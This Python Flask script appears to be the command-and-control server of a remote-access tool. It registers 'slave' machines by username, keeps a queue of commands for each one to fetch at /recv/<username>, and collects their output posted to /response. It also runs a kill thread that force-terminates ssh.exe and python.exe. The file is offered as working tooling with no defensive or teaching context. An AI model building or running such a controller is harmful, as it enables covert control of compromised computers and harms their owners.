try:
    from multiprocessing import Process
    import os,sys,threading
    import signal
    from flask import Flask, request
except:
    import os
    os.system("python3 -m pip install flask")
    try:
        from flask import Flask, request
    except:
        os.system("pip3 install flask")
        from flask import Flask, request
from control import linx,printfc


import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)


@app.route('/')
def index():
    return "welcome to the script's world!"

def checkexsisteduser():
    try:
        with open("." + linx() + "data" + linx() + "users.txt","r") as userx:
            data = userx.read()
            userx.close()
            return data
    except:
        os.system("echo '' > " + os.getcwd() + linx() + "data" + linx() + "users.txt")
        return ""

def addslave(conx):
    if conx in checkexsisteduser():
        pass
    else:
        with open("." + linx() + "data" + linx() + "users.txt","a") as userx:
            userx.write(conx + str("\n"))
            userx.close()

@app.route('/add/<username>')
def add(username):
    try:
        os.makedirs("." + linx() + "data" + linx() + username)
    except:
        pass
    addslave(username)
    return "DONE"

@app.route('/recv/<username>')
def recv(username):
    try:
        with open("." + linx() + "data" + linx() + username + linx() + "recv.txt", "r") as file:
            newfile = file.read()
            file.close()
            os.remove("." + linx() + "data" + linx() + username + linx() + "recv.txt")
            return newfile
    except:
        return "None"



@app.route('/response', methods=['GET', 'POST'])
def response():
    if request.method == "POST":
        data = request.data.decode('latin-1')
        with open("response.txt", "w+") as file:
            #print("\n")
            #printfc(data, "cyan")
            file.write(data)
            file.close()
        return "zenX"
    else:
        return "Your in the wrong place son!"


def killx():
    while True:
        if os.path.isfile('exit.asw'):
            if os.name == "posix":
                os.system("rm exit.asw")
                server.terminate()
                server.join()
            else:
                os.system("del exit.asw")
                os.system("taskkill /f /im  ssh.exe")
                os.system("taskkill /f /im  python.exe")
            sys.exit()


if __name__ == '__main__':
    tr = threading.Thread(target=killx)
    tr.daemon = True
    tr.start()
    if os.name == "nt":
        app.run()
    else:
        server = Process(target=app.run)
        server.start()
